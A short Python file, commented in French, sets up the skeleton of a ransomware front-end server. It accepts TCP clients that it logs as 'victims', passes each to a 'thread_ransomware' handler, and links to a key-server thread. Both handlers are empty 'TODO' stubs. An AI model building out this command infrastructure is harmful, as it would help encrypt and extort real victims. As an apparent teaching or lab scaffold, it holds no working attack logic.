import threading
import queue
import socket
from threading import Thread
from utile.network import recv_msg, send_msg


class serveur_frontal(object):

    def __init__(self, ip, port):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port

    def start_server(self):
        queue_messages_receiv = queue.Queue()
        thread_s_cles = Thread(target=self.thread_srv_cles, args=(queue_messages_receiv,))
        thread_s_cles.start()

        queue_messages_receiv.get()
        print(f'Connection entre le serveur frontale et le serveur de clés effectuée')
        queue_messages_receiv.task_done()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        s.listen(10)
        print(f'$-F: Server started ! Waiting for clients...')
        while True:
            c_v, a_v = s.accept()
            print(f'Nouvelle victime : {a_v}')
            queue_victim = queue.Queue()
            t_v = Thread(target=self.thread_ransomware, args=(c_v, queue_messages_receiv, queue_victim,))
            t_v.start()
        s.close()

    def thread_srv_cles(self, q_messages_receiv):
        print('TODO')

    def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
        print('TODO')